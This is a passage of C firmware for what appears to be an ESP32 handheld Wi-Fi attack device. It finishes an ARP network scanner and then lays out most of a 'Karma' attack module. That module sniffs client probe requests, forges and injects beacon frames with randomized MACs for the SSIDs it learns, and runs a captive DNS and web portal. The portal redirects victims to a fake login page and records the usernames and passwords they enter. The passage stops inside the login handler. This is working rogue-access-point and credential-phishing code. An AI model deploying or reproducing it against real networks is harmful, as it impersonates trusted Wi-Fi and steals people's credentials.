      ArpScanner_s_apCount <= 0) {
    return;
  }
  if (ArpScanner_s_currentIndex < 0 ||
      ArpScanner_s_currentIndex >= ArpScanner_s_apCount) {
    return;
  }

  __auto_type ap = &(ArpScanner_s_aps[ArpScanner_s_currentIndex]);
  text_t password = {0};

  if ((*ap).authmode != WIFI_AUTH_OPEN) {
    if (!ArpScanner_promptPassword(&(password))) {
      ArpScanner_drawScreen(true);
      return;
    }
  }

  if (!ArpScanner_connectToAp(&((*ap)), (password).data)) {
    ArpScanner_displayBusy("Join failed.", "Check password / signal.");
    sys_sleep_ms(900);
    ArpScanner_s_phase = ArpScanner_Phase_ApList;
    ArpScanner_drawScreen(true);
    return;
  }

  ArpScanner_runArpSweep();
}

static void ArpScanner_handleNavButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - ArpScanner_s_lastBtnMs < ArpScanner_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (ArpScanner_s_scanning) {
    return;
  }

  const int count = (ArpScanner_s_phase == ArpScanner_Phase_ApList)
                        ? ArpScanner_s_apCount
                        : ArpScanner_s_hostCount;

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
      ArpScanner_scanAccessPoints();
    } else {
      ArpScanner_runArpSweep();
    }
    ArpScanner_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
      ArpScanner_joinSelectedAp();
    } else {
      ArpScanner_disconnectSta();
      ArpScanner_s_phase = ArpScanner_Phase_ApList;
      ArpScanner_s_hostCount = 0;
      ArpScanner_s_currentIndex = 0;
      ArpScanner_s_currentPage = 0;
      ArpScanner_s_lastRenderedPage = -1;
      ArpScanner_drawScreen(true);
    }
    ArpScanner_s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    if (count > 0) {
      ArpScanner_s_currentIndex = (ArpScanner_s_currentIndex + 1) % count;
      ArpScanner_drawScreen(false);
    }
    ArpScanner_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (count > 0) {
      ArpScanner_s_currentIndex =
          (ArpScanner_s_currentIndex - 1 + count) % count;
      ArpScanner_drawScreen(false);
    }
    ArpScanner_s_lastBtnMs = now;
    return;
  }
}

static void ArpScanner_handleTouch(void) {
  int x, y;
  if (!feature_active || !readTouchXY(&(x), &(y))) {
    return;
  }
  if (ArpScanner_s_scanning) {
    return;
  }

  const int count = (ArpScanner_s_phase == ArpScanner_Phase_ApList)
                        ? ArpScanner_s_apCount
                        : ArpScanner_s_hostCount;
  const int perPage = ArpScanner_networksPerPage();
  if (y >= ArpScanner_LIST_FIRST_ROW_Y && y < wifiListBottomY() && count > 0) {
    const int row = (y - ArpScanner_LIST_FIRST_ROW_Y) / ArpScanner_LIST_ROW_H;
    const int idx = ArpScanner_s_currentPage * perPage + row;
    if (row >= 0 && row < perPage && idx < count) {
      ArpScanner_s_currentIndex = idx;
      ArpScanner_drawScreen(false);
      sys_sleep_ms(120);
      if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
        ArpScanner_joinSelectedAp();
      }
    }
  }
}

static void ArpScanner_runUI(void) {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_undo,
                                                 bitmap_icon_go_back};

  if (!ArpScanner_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    ArpScanner_s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
          ArpScanner_scanAccessPoints();
        } else {
          ArpScanner_runArpSweep();
        }
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void ArpScanner_teardown(void) {
  ArpScanner_disconnectSta();
  network_clear_scan();
  ArpScanner_s_scanning = false;
}

void ArpScanner_arpScannerSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  ArpScanner_s_uiDrawn = false;
  ArpScanner_s_phase = ArpScanner_Phase_ApList;
  ArpScanner_s_apCount = 0;
  ArpScanner_s_hostCount = 0;
  ArpScanner_s_currentIndex = 0;
  ArpScanner_s_currentPage = 0;
  ArpScanner_s_scanning = false;
  ArpScanner_s_lastRenderedIndex = -1;
  ArpScanner_s_lastRenderedPage = -1;
  ArpScanner_s_joinedSsid[0] = '\0';

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  ArpScanner_runUI();
  ArpScanner_updateNavLabels();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  ArpScanner_scanAccessPoints();
}

void ArpScanner_arpScannerLoop(void) {
  if (feature_exit_requested) {
    ArpScanner_teardown();
    return;
  }
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    ArpScanner_teardown();
    feature_exit_requested = true;
    return;
  }

  ArpScanner_handleNavButtons();
  ArpScanner_handleTouch();
  updateStatusBar();
  ArpScanner_runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    ArpScanner_teardown();
  }
}

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2
#undef LINE_HEIGHT
#define LINE_HEIGHT 12

enum { KarmaAttack_TERM_CAPACITY = 24 };
enum { KarmaAttack_CARDS_Y = 42 };
enum { KarmaAttack_CARD_H = 34 };
enum { KarmaAttack_CARD_W = 70 };
enum { KarmaAttack_CARD_GAP = 7 };
enum { KarmaAttack_CARD_MARGIN = 8 };
enum { KarmaAttack_INFO_ROW_H = 16 };
enum { KarmaAttack_AP_Y = 82 };
enum { KarmaAttack_TOP_Y = 98 };
enum { KarmaAttack_BAR_ZONE_W = 30 };
enum { KarmaAttack_ACT_LABEL_Y = 118 };
enum { KarmaAttack_TERM_TOP_Y = 134 };
enum { KarmaAttack_MAX_PROBE_SSIDS = 32 };
static const unsigned long KarmaAttack_HOP_MS = 800;
static const unsigned long KarmaAttack_AP_SWITCH_MS = 2500;
static const unsigned long KarmaAttack_BEACON_GAP_MS = 15;
static const unsigned long KarmaAttack_BTN_DEBOUNCE_MS = 200;
static const unsigned long KarmaAttack_STATS_MS = 1000;
enum { KarmaAttack_DNS_PORT = 53 };
static const char* KarmaAttack_kTestSsids[] = {"TestKarma", "FreeWiFi",
                                               "HomeWiFi", "ESP32-DIV"};
enum { KarmaAttack_kTestSsidCount = 4 };

typedef struct KarmaAttack_ProbeSsid {
  char ssid[33];
  uint16_t hits;
  int8_t rssi;
  uint8_t channel;
  uint32_t lastSeenMs;
} KarmaAttack_ProbeSsid;
#define KarmaAttack_ProbeSsid_INITIALIZER {0}
;

static KarmaAttack_ProbeSsid KarmaAttack_s_list[KarmaAttack_MAX_PROBE_SSIDS];
static int KarmaAttack_s_count = 0;

static bool KarmaAttack_s_running = false;
static bool KarmaAttack_s_uiDrawn = false;
static bool KarmaAttack_s_headerDirty = true;
static bool KarmaAttack_s_portalUp = false;
static unsigned long KarmaAttack_s_lastBtnMs = 0;
static unsigned long KarmaAttack_s_lastHopMs = 0;
static unsigned long KarmaAttack_s_lastApSwitchMs = 0;
static unsigned long KarmaAttack_s_lastBeaconMs = 0;
static unsigned long KarmaAttack_s_lastStatsMs = 0;
static uint8_t KarmaAttack_s_channel = 6;
static uint8_t KarmaAttack_s_beaconIdx = 0;
static int KarmaAttack_s_activeApIndex = -1;
static uint32_t KarmaAttack_s_probeFrames = 0;
static uint32_t KarmaAttack_s_namedProbes = 0;
static uint32_t KarmaAttack_s_beaconsSent = 0;
static uint32_t KarmaAttack_s_beaconRate = 0;
static uint32_t KarmaAttack_s_beaconsAtMark = 0;
static unsigned long KarmaAttack_s_rateMarkMs = 0;
static uint8_t KarmaAttack_s_lastClients = 0;

static char KarmaAttack_s_apSsid[33] = "";
static char KarmaAttack_s_lastUser[32] = "";
static char KarmaAttack_s_lastPass[32] = "";
static uint16_t KarmaAttack_s_credCount = 0;

enum {
  KarmaAttack_s_term_COUNT = KarmaAttack_TERM_CAPACITY,
  KarmaAttack_s_term_OFFSET = CaptivePortal_terminalBuffer_OFFSET +
      CaptivePortal_terminalBuffer_COUNT
};
_Static_assert(KarmaAttack_s_term_OFFSET + KarmaAttack_s_term_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define KarmaAttack_s_term                  \
  (*(text_t(*)[KarmaAttack_s_term_COUNT]) & \
   feature_text_slots[KarmaAttack_s_term_OFFSET])
static uint16_t KarmaAttack_s_termColor[KarmaAttack_TERM_CAPACITY];
static int KarmaAttack_s_termLines = 0;

static captive_dns_t KarmaAttack_s_dns;
static httpd_handle_t KarmaAttack_s_server = NULL;
static portMUX_TYPE KarmaAttack_s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool KarmaAttack_s_logPending = false;
static char KarmaAttack_s_pendingLog[48];
static uint16_t KarmaAttack_s_pendingLogColor = 0xffff;

static uint8_t KarmaAttack_s_beaconFrame[128];
static uint8_t KarmaAttack_s_srcMac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};

static char KarmaAttack_s_hdrCacheAp[52] = "";
static char KarmaAttack_s_hdrCacheTop[52] = "";
static char KarmaAttack_s_cardCache[3][10] = {"", "", ""};
static uint16_t KarmaAttack_s_cardColor[3] = {0, 0, 0};
static int KarmaAttack_s_barsCache = -2;
static bool KarmaAttack_s_navDrawnRunning = false;
static bool KarmaAttack_s_navDrawn = false;
static bool KarmaAttack_s_chromeDrawn = false;

static void KarmaAttack_runUI(void);
static void KarmaAttack_drawDashboard(bool full);
static void KarmaAttack_updateHeader(bool force);
static void KarmaAttack_updateNavLabels(bool force);
static void KarmaAttack_logLine(text_t text, uint16_t color);
static void KarmaAttack_flushPendingLog(void);
static void KarmaAttack_startKarma(void);
static void KarmaAttack_stopKarma(void);
static void KarmaAttack_clearLearned(void);
static void KarmaAttack_promptAddSsid(void);
static const char* KarmaAttack_kLoginHtml;
static esp_err_t karma_login_page(httpd_req_t* req) {
  httpd_resp_set_type(req, "text/html");
  return httpd_resp_send(req, KarmaAttack_kLoginHtml, HTTPD_RESP_USE_STRLEN);
}
static void KarmaAttack_ensurePortal(void);
static void KarmaAttack_stopPortal(void);
static void KarmaAttack_maybeSwitchAp(void);
static void KarmaAttack_sendNextBeacon(void);
static void KarmaAttack_hopIfNeeded(void);
static void KarmaAttack_paintTextLine(int y, int x, int w, char* cache,
                                      size_t cacheSz, const char* text,
                                      uint16_t color);
static void KarmaAttack_invalidateHeaderCache(void);
static void KarmaAttack_tickBeaconRate(void);
static void KarmaAttack_truncSsid(char* out, size_t n, const char* ssid,
                                  size_t maxChars);
static bool KarmaAttack_bestSsidSnapshot(KarmaAttack_ProbeSsid* out);
static int KarmaAttack_cardX(int i);
static void KarmaAttack_drawStatCardsChrome(void);
static void KarmaAttack_paintStatCardValue(int i, const char* value,
                                           uint16_t color);
static int KarmaAttack_rssiBars(int8_t rssi);
static void KarmaAttack_drawSignalBars(int x, int baseY, int bars);
static bool KarmaAttack_paintTextLineEx(int y, int x, int w, char* cache,
                                        size_t cacheSz, const char* text,
                                        uint16_t color);
static bool KarmaAttack_paintInfoRow(int y, char* cache, size_t cacheSz,
                                     const char* text, uint16_t color,
                                     int textMaxW);

static int KarmaAttack_termVisibleLines(void) {
  return DIV_MIN(KarmaAttack_TERM_CAPACITY,
                 wifiMaxLinesInZone(KarmaAttack_TERM_TOP_Y, LINE_HEIGHT));
}

static void KarmaAttack_invalidateHeaderCache(void) {
  KarmaAttack_s_hdrCacheAp[0] = '\0';
  KarmaAttack_s_hdrCacheTop[0] = '\0';
  KarmaAttack_s_cardCache[0][0] = '\0';
  KarmaAttack_s_cardCache[1][0] = '\0';
  KarmaAttack_s_cardCache[2][0] = '\0';
  KarmaAttack_s_cardColor[0] = 0;
  KarmaAttack_s_cardColor[1] = 0;
  KarmaAttack_s_cardColor[2] = 0;
  KarmaAttack_s_barsCache = -2;
}

static int KarmaAttack_cardX(int i) {
  return KarmaAttack_CARD_MARGIN +
         i * (KarmaAttack_CARD_W + KarmaAttack_CARD_GAP);
}

static void KarmaAttack_drawStatCardsChrome(void) {
  static const char* kLabels[3] = {"SSIDS", "TX/S", "CLIENTS"};
  display_set_text_datum(&(tft), MC_DATUM);
  display_set_text_font(&(tft), 1);
  for (int i = 0; i < 3; i++) {
    const int x = KarmaAttack_cardX(i);
    display_fill_round_rect(&(tft), x, KarmaAttack_CARDS_Y, KarmaAttack_CARD_W,
                            KarmaAttack_CARD_H, 4, UI_FG);
    display_draw_round_rect(&(tft), x, KarmaAttack_CARDS_Y, KarmaAttack_CARD_W,
                            KarmaAttack_CARD_H, 4, UI_LINE);
    display_set_text_color_2(&(tft), UI_DIM_TEXT, UI_FG);
    display_draw_string(&(tft), kLabels[i], x + KarmaAttack_CARD_W / 2,
                        KarmaAttack_CARDS_Y + 8, 0);
  }
  display_set_text_datum(&(tft), TL_DATUM);
}

static void KarmaAttack_paintStatCardValue(int i, const char* value,
                                           uint16_t color) {
  if (i < 0 || i > 2 || !value) {
    return;
  }
  if (strcmp(KarmaAttack_s_cardCache[i], value) == 0 &&
      KarmaAttack_s_cardColor[i] == color) {
    return;
  }
  const int x = KarmaAttack_cardX(i);
  display_fill_rect(&(tft), x + 2, KarmaAttack_CARDS_Y + 16,
                    KarmaAttack_CARD_W - 4, KarmaAttack_CARD_H - 18, UI_FG);
  display_set_text_datum(&(tft), MC_DATUM);
  display_set_text_font(&(tft), 2);
  display_set_text_color_2(&(tft), color, UI_FG);
  display_draw_string(&(tft), value, x + KarmaAttack_CARD_W / 2,
                      KarmaAttack_CARDS_Y + 24, 0);
  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_font(&(tft), 1);
  strncpy(KarmaAttack_s_cardCache[i], value,
          sizeof(KarmaAttack_s_cardCache[i]) - 1);
  KarmaAttack_s_cardCache[i][sizeof(KarmaAttack_s_cardCache[i]) - 1] = '\0';
  KarmaAttack_s_cardColor[i] = color;
}

static int KarmaAttack_rssiBars(int8_t rssi) {
  if (rssi >= -55) return 4;
  if (rssi >= -67) return 3;
  if (rssi >= -78) return 2;
  if (rssi >= -88) return 1;
  return 0;
}

static void KarmaAttack_drawSignalBars(int x, int baseY, int bars) {
  for (int i = 0; i < 4; i++) {
    const int h = 3 + i * 2;
    const int bx = x + i * 5;
    const int by = baseY - h;
    const uint16_t c = (i < bars) ? ORANGE : UI_LINE;
    display_fill_rect(&(tft), bx, by, 3, h, c);
  }
}

static void KarmaAttack_truncSsid(char* out, size_t n, const char* ssid,
                                  size_t maxChars) {
  if (!out || n == 0) {
    return;
  }
  if (!ssid) {
    out[0] = '\0';
    return;
  }
  const size_t len = strlen(ssid);
  if (len <= maxChars || maxChars < 2 || n < 2) {
    strncpy(out, ssid, n - 1);
    out[n - 1] = '\0';
    return;
  }
  const size_t keep = maxChars - 1;
  if (keep >= n) {
    strncpy(out, ssid, n - 1);
    out[n - 1] = '\0';
    return;
  }
  memcpy(out, ssid, keep);
  out[keep] = '~';
  out[keep + 1] = '\0';
}

static void KarmaAttack_tickBeaconRate(void) {
  const unsigned long now = sys_monotonic_ms();
  if (KarmaAttack_s_rateMarkMs == 0) {
    KarmaAttack_s_rateMarkMs = now;
    KarmaAttack_s_beaconsAtMark = KarmaAttack_s_beaconsSent;
    KarmaAttack_s_beaconRate = 0;
    return;
  }
  if (now - KarmaAttack_s_rateMarkMs < 1000) {
    return;
  }
  KarmaAttack_s_beaconRate =
      KarmaAttack_s_beaconsSent - KarmaAttack_s_beaconsAtMark;
  KarmaAttack_s_beaconsAtMark = KarmaAttack_s_beaconsSent;
  KarmaAttack_s_rateMarkMs = now;
}

static bool KarmaAttack_bestSsidSnapshot(KarmaAttack_ProbeSsid* out) {
  bool ok = false;
  portENTER_CRITICAL(&KarmaAttack_s_mux);
  if (KarmaAttack_s_count > 0) {
    int best = 0;
    for (int i = 1; i < KarmaAttack_s_count; i++) {
      if (KarmaAttack_s_list[i].hits > KarmaAttack_s_list[best].hits) {
        best = i;
      } else if (KarmaAttack_s_list[i].hits == KarmaAttack_s_list[best].hits &&
                 KarmaAttack_s_list[i].lastSeenMs >
                     KarmaAttack_s_list[best].lastSeenMs) {
        best = i;
      }
    }
    (*out) = KarmaAttack_s_list[best];
    ok = true;
  }
  portEXIT_CRITICAL(&KarmaAttack_s_mux);
  return ok;
}

static bool KarmaAttack_paintTextLineEx(int y, int x, int w, char* cache,
                                        size_t cacheSz, const char* text,
                                        uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return false;
  }

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  const int oldW =
      (cache && cache[0]) ? display_text_width(&(tft), cache, 0) : 0;
  const int newW = text[0] ? display_text_width(&(tft), text, 0) : 0;
  int clearW = oldW > newW ? oldW : newW;
  clearW += 4;
  if (clearW > w) {
    clearW = w;
  }
  if (clearW < 1) {
    clearW = 1;
  }

  display_fill_rect(&(tft), x, y, clearW, LINE_HEIGHT, TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), x, y);
  display_print(&(tft), (TEXT(text)).data);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
  return true;
}

// Full-width row clear so AP / Top never ghost or overlay each other.
static bool KarmaAttack_paintInfoRow(int y, char* cache, size_t cacheSz,
                                     const char* text, uint16_t color,
                                     int textMaxW) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return false;
  }

  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, KarmaAttack_INFO_ROW_H,
                    TFT_BLACK);
  display_set_text_color_2(&(tft), color, TFT_BLACK);
  display_set_cursor(&(tft), KarmaAttack_CARD_MARGIN, y + 3);
  display_print(&(tft), (TEXT(text)).data);
  (void)textMaxW;
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
  return true;
}

static void KarmaAttack_paintTextLine(int y, int x, int w, char* cache,
                                      size_t cacheSz, const char* text,
                                      uint16_t color) {
  (void)KarmaAttack_paintTextLineEx(y, x, w, cache, cacheSz, text, color);
}

static void KarmaAttack_updateNavLabels(bool force) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (!force && KarmaAttack_s_navDrawn &&
      KarmaAttack_s_navDrawnRunning == KarmaAttack_s_running) {
    return;
  }
  KarmaAttack_s_navDrawnRunning = KarmaAttack_s_running;
  KarmaAttack_s_navDrawn = true;
  setTouchNavLabels(KarmaAttack_s_running ? "Stop" : "Start", "Clear", "Exit",
                    "Add", NULL);
  redrawTouchButtonBar();
}

static bool KarmaAttack_parseSsidIe(const uint8_t* ie, int ieLen, char* out,
                                    size_t outSz) {
  if (!ie || ieLen < 2 || !out || outSz < 2) {
    return false;
  }
  int off = 0;
  while (off + 2 <= ieLen) {
    const uint8_t id = ie[off];
    const uint8_t len = ie[off + 1];
    if (off + 2 + len > ieLen) {
      break;
    }
    if (id == 0) {
      if (len == 0 || len > 32) {
        return false;
      }
      bool allZero = true;
      for (uint8_t i = 0; i < len; i++) {
        if (ie[off + 2 + i] != 0) {
          allZero = false;
          break;
        }
      }
      if (allZero) {
        return false;
      }
      const size_t n = DIV_MIN((size_t)len, outSz - 1);
      memcpy(out, &ie[off + 2], n);
      out[n] = '\0';
      return true;
    }
    off += 2 + len;
  }
  return false;
}

static void KarmaAttack_queueLogFromIsr(const char* text, uint16_t color) {
  strncpy(KarmaAttack_s_pendingLog, text, sizeof(KarmaAttack_s_pendingLog) - 1);
  KarmaAttack_s_pendingLog[sizeof(KarmaAttack_s_pendingLog) - 1] = '\0';
  KarmaAttack_s_pendingLogColor = color;
  KarmaAttack_s_logPending = true;
}

static int KarmaAttack_findSsidIndex(const char* ssid) {
  for (int i = 0; i < KarmaAttack_s_count; i++) {
    if (strcmp(KarmaAttack_s_list[i].ssid, ssid) == 0) {
      return i;
    }
  }
  return -1;
}

static int KarmaAttack_hottestIndex(void) {
  if (KarmaAttack_s_count <= 0) {
    return -1;
  }
  int best = 0;
  for (int i = 1; i < KarmaAttack_s_count; i++) {
    if (KarmaAttack_s_list[i].hits > KarmaAttack_s_list[best].hits) {
      best = i;
    } else if (KarmaAttack_s_list[i].hits == KarmaAttack_s_list[best].hits &&
               KarmaAttack_s_list[i].lastSeenMs >
                   KarmaAttack_s_list[best].lastSeenMs) {
      best = i;
    }
  }
  return best;
}

static void KarmaAttack_recordProbeSsid(const char* ssid, int8_t rssi,
                                        uint8_t channel) {
  if (!ssid || !ssid[0]) {
    return;
  }

  bool isNew = false;
  portENTER_CRITICAL(&KarmaAttack_s_mux);
  int found = KarmaAttack_findSsidIndex(ssid);
  if (found >= 0) {
    if (KarmaAttack_s_list[found].hits < 0xFFFF) {
      KarmaAttack_s_list[found].hits++;
    }
    KarmaAttack_s_list[found].rssi = rssi;
    KarmaAttack_s_list[found].lastSeenMs = sys_monotonic_ms();
    if (channel >= 1 && channel <= 14) {
      KarmaAttack_s_list[found].channel = channel;
    }
  } else if (KarmaAttack_s_count < KarmaAttack_MAX_PROBE_SSIDS) {
    __auto_type e = &(KarmaAttack_s_list[KarmaAttack_s_count]);
    strncpy((*e).ssid, ssid, sizeof((*e).ssid) - 1);
    (*e).ssid[sizeof((*e).ssid) - 1] = '\0';
    (*e).hits = 1;
    (*e).rssi = rssi;
    (*e).channel =
        (channel >= 1 && channel <= 14) ? channel : KarmaAttack_s_channel;
    (*e).lastSeenMs = sys_monotonic_ms();
    KarmaAttack_s_count++;
    isNew = true;
  }
  portEXIT_CRITICAL(&KarmaAttack_s_mux);

  if (isNew) {
    char buf[48];
    snprintf(buf, sizeof(buf), "[+] learn %s", ssid);
    KarmaAttack_queueLogFromIsr(buf, GREEN);
    KarmaAttack_s_headerDirty = true;
  }
}

static void KarmaAttack_snifferCallback(void* buf,
                                        wifi_promiscuous_pkt_type_t type) {
  if (!feature_active || !KarmaAttack_s_running) {
    return;
  }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_MISC) {
    return;
  }

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (!pkt) {
    return;
  }

  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) {
    return;
  }
  if ((p[0] & 0xFC) != 0x40) {
    return;
  }

  KarmaAttack_s_probeFrames++;

  char ssid[33];
  bool ok = KarmaAttack_parseSsidIe(p + 24, len - 24, ssid, sizeof(ssid));
  if (!ok && len > 28) {
    ok = KarmaAttack_parseSsidIe(p + 24, len - 28, ssid, sizeof(ssid));
  }
  if (!ok) {
    return;
  }
  for (const char* c = ssid; *c; ++c) {
    if ((uint8_t)*c < 0x20 || (uint8_t)*c > 0x7E) {
      return;
    }
  }

  KarmaAttack_s_namedProbes++;
  uint8_t ch = pkt->rx_ctrl.channel;
  if (ch < 1 || ch > 14) {
    ch = KarmaAttack_s_channel;
  }
  KarmaAttack_recordProbeSsid(ssid, pkt->rx_ctrl.rssi, ch);
}

static uint16_t KarmaAttack_buildBeacon(const char* ssid, uint8_t channel,
                                        uint8_t* out, uint16_t outMax) {
  if (!ssid || !out || outMax < 64) {
    return 0;
  }
  const uint8_t ssidLen = (uint8_t)DIV_MIN((size_t)32, strlen(ssid));
  // 24 hdr + 12 fixed + 2+ssid + 10 rates + 3 ds
  const uint16_t need = (uint16_t)(24 + 12 + 2 + ssidLen + 10 + 3);
  if (need > outMax) {
    return 0;
  }

  uint16_t pos = 0;
  out[pos++] = 0x80;  // Beacon
  out[pos++] = 0x00;
  out[pos++] = 0x00;
  out[pos++] = 0x00;
  memset(&out[pos], 0xFF, 6);  // DA broadcast
  pos += 6;
  memcpy(&out[pos], KarmaAttack_s_srcMac, 6);  // SA
  pos += 6;
  memcpy(&out[pos], KarmaAttack_s_srcMac, 6);  // BSSID
  pos += 6;
  out[pos++] = 0x00;
  out[pos++] = 0x00;  // seq

  memset(&out[pos], 0, 8);  // timestamp
  pos += 8;
  out[pos++] = 0x64;
  out[pos++] = 0x00;  // beacon interval
  out[pos++] = 0x01;
  out[pos++] = 0x04;  // caps: ESS + privacy off / short preamble-ish

  out[pos++] = 0x00;
  out[pos++] = ssidLen;
  memcpy(&out[pos], ssid, ssidLen);
  pos += ssidLen;

  static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b,
                                  0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(&out[pos], rates, sizeof(rates));
  pos += sizeof(rates);

  out[pos++] = 0x03;
  out[pos++] = 0x01;
  out[pos++] = channel;
  return pos;
}

static void KarmaAttack_sendNextBeacon(void) {
  if (!KarmaAttack_s_running || KarmaAttack_s_count <= 0) {
    return;
  }
  if (sys_monotonic_ms() - KarmaAttack_s_lastBeaconMs <
      KarmaAttack_BEACON_GAP_MS) {
    return;
  }
  KarmaAttack_s_lastBeaconMs = sys_monotonic_ms();

  if (KarmaAttack_s_beaconIdx >= KarmaAttack_s_count) {
    KarmaAttack_s_beaconIdx = 0;
  }

  KarmaAttack_ProbeSsid entry = KarmaAttack_ProbeSsid_INITIALIZER;
  portENTER_CRITICAL(&KarmaAttack_s_mux);
  entry = KarmaAttack_s_list[KarmaAttack_s_beaconIdx];
  const int n = KarmaAttack_s_count;
  portEXIT_CRITICAL(&KarmaAttack_s_mux);

  KarmaAttack_s_beaconIdx =
      (uint8_t)((KarmaAttack_s_beaconIdx + 1) % DIV_MAX(1, n));

  // Randomize locally-administered MAC each burst for variety.
  KarmaAttack_s_srcMac[1] = sys_random_range_1(256);
  KarmaAttack_s_srcMac[2] = sys_random_range_1(256);
  KarmaAttack_s_srcMac[3] = sys_random_range_1(256);
  KarmaAttack_s_srcMac[4] = sys_random_range_1(256);
  KarmaAttack_s_srcMac[5] = sys_random_range_1(256);
  KarmaAttack_s_srcMac[0] = 0x02;

  const uint16_t len = KarmaAttack_buildBeacon(
      entry.ssid, KarmaAttack_s_channel, KarmaAttack_s_beaconFrame,
      sizeof(KarmaAttack_s_beaconFrame));
  if (len == 0) {
    return;
  }
  esp_wifi_set_channel(KarmaAttack_s_channel, WIFI_SECOND_CHAN_NONE);
  if (esp_wifi_80211_tx(WIFI_IF_AP, KarmaAttack_s_beaconFrame, len, false) ==
      ESP_OK) {
    KarmaAttack_s_beaconsSent++;
  }
}

static void KarmaAttack_stopPortal(void) {
  if (KarmaAttack_s_server) {
    httpd_stop(KarmaAttack_s_server);
    KarmaAttack_s_server = NULL;
  }
  captive_dns_stop(&(KarmaAttack_s_dns));
  KarmaAttack_s_portalUp = false;
}

static esp_err_t KarmaAttack_karmaRedirectLogin(httpd_req_t* req) {
  httpd_resp_set_status(req, "302 Found");
  httpd_resp_set_hdr(req, "Location", "/login.html");
  return httpd_resp_send(req, "", 0);
}
typedef struct KarmaAttack_LoginEvent {
  char user[64];
  char password[64];
} KarmaAttack_LoginEvent;
#define KarmaAttack_LoginEvent_INITIALIZER {0}
;
static QueueHandle_t KarmaAttack_login_queue = NULL;
static esp_err_t KarmaAttack_karmaHandleLoginPost(httpd_req_t* req) {
